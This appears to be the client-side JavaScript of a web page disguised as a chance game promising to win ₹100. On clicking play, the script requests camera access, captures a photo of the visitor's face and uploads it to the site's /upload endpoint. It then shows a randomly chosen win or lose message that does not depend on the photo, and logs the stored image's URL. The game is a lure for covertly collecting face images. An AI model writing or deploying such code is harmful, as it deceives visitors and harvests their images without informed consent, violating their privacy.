const playBtn = document.getElementById("playBtn");
const statusEl = document.getElementById("status");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

let stream = null;

async function getCameraStream() {
  if (stream) return stream;
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    video.srcObject = stream;
    return stream;
  } catch (err) {
    console.error("Camera error:", err);
    statusEl.textContent = "❌ Camera permission required.";
    statusEl.style.color = "red";
    throw err;
  }
}

function stopStream() {
  if (!stream) return;
  stream.getTracks().forEach(t => t.stop());
  stream = null;
}

function showWin() {
  statusEl.innerHTML = `<span class="win">✅ You Win ₹100!</span>`;
}

function showLose() {
  statusEl.innerHTML = `<span class="lose">🔴 You Lost ₹100!</span>`;
}

playBtn.addEventListener("click", async () => {
  statusEl.textContent = "Processing...";
  statusEl.style.color = "#333";

  try {
    await getCameraStream();

    await new Promise(r => setTimeout(r, 600));

    const w = video.videoWidth || 640;
    const h = video.videoHeight || 480;
    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, w, h);

    canvas.toBlob(async (blob) => {
      if (!blob) {
        statusEl.textContent = "Capture failed";
        stopStream();
        return;
      }

      const form = new FormData();
      form.append("photo", blob, `capture_${Date.now()}.jpg`);

      try {
        const res = await fetch("/upload", { method: "POST", body: form });
        const data = await res.json();
        if (data && data.success) {
          const win = Math.random() < 0.5;
          const absolute = data.absoluteUrl || (data.filePath ? `${location.origin}${data.filePath}` : null);
          if (win) showWin();
          else showLose();
          console.log("Uploaded URL:", absolute); // ✅ still prints in console/logs
        } else {
          statusEl.textContent = "Upload failed";
          statusEl.style.color = "red";
        }
      } catch (err) {
        console.error("Upload error:", err);
        statusEl.textContent = "Upload error";
        statusEl.style.color = "red";
      } finally {
        stopStream();
      }
    }, "image/jpeg", 0.9);

  } catch (err) {}
});